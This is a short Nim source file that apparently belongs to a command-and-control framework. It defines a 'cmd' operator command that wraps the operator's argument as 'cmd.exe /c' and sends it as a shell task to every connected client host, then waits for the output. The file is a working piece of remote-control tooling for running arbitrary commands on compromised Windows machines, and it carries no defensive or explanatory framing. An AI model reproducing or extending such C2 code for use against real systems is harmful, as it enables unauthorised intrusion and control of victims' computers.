import asyncdispatch, strutils, tables, json

import ../../types, ../../communication, ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "you must specify a command, check 'help cmd'"
    return

  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("shell", %*[ "cmd.exe /c " & args[0] ])
    if not task.isNil(): await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "cmd",
  argsLength: 1,
  usage: @["cmd \"[command]\""],
  cliMode: @[ClientInteractMode],
  description: "Run a command via cmd.exe",
  category: CCClientInteraction,
  requiresConnectedClient: true
)